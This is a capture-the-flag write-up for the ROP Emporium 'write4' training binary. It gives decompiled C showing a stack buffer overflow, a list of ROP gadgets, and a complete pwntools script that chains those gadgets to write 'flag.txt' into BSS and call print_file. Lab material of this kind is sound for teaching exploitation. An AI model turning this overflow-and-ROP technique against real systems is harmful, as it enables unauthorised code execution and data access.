# Write4

## Reversing with Ghidra

### main
```c
int main() {
  pwnme();
  return 0;
}
```

### pwnme
```c
void pwnme() {
  char input[32];
  
  puts("write4 by ROP Emporium");
  puts("x86_64\n");
  memset(input, 0, 0x20);
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0, input, 0x200);
  puts("Thank you!");
}
```

### print_file
```c
void print_file(char *file_name) {
  char buf[40];
  FILE *file;
  
  file = 0;
  file = fopen(file_name, "r");
  
  if (file == 0) {
    printf("Failed to open file: %s\n", file_name);
    exit(1);
  }

  fgets(buf, 0x21, file);
  puts(buf);
  fclose(file);
  
  return;
}
```

## The vuln
A `Buffer Overflow` on the stack and a couple of cool gadgets, give us arbitrary write.

[Vulnerable code (pwnme function)](#pwnme)

To make our lifes easier, there's [this](#print_file) function taking a file's name as parameter, which dumps the file content on stdout.

## The exploit
We can use `ropper` or similar tools to find some useful gadgets. The following gadgets can be what we're searching for:

```assembly
0x0000000000400693: pop rdi; ret;
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400628: mov qword ptr [r14], r15; ret;
```

The first one can be used to `pop` things in `rdi` (used as first parameter for functions)
The second one can be used to pop things on `r14` and `r15`.
The third one (in combination with the second one) can be used to obtain arbitrary write: the content of `r15` is moved into the memory pointed by the address stored in `r14`.

Moving in `r14` a writable address (e.g. an address inside the `BSS` segment) we can store here the string `flag.txt`, then is possible to call `print_file` with the selected writeable address as parameter.

## The script
```py
from pwn import *

#
# Context
#

e = context.binary = ELF('write4')

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x200))
io.wait()
core = io.corefile
io.close()

offset = cyclic_find(core.read(core.rsp, 4))

info(f'Offset: {offset}')

#
# ROP
#

PRINT_FILE      = p64(e.plt['print_file'])

POP_RDI         = p64(next(e.search(asm('pop rdi; ret;'))))
POP_R14_R15     = p64(next(e.search(asm('pop r14; pop r15; ret;'))))
DEREF_R15_R14   = p64(next(e.search(asm('mov qword ptr [r14], r15; ret;'))))

BSS_WRITE       = p64(e.bss(offset=0x200))

#
# Exploit
#

io = process(e.path)

payload  = b''
payload += b'A' * offset

payload += POP_R14_R15
payload += BSS_WRITE
payload += b'flag.txt'
payload += DEREF_R15_R14
payload += POP_RDI
payload += BSS_WRITE
payload += PRINT_FILE

io.sendlineafter(b'> ', payload)

print(io.recvrepeat(1).decode())
```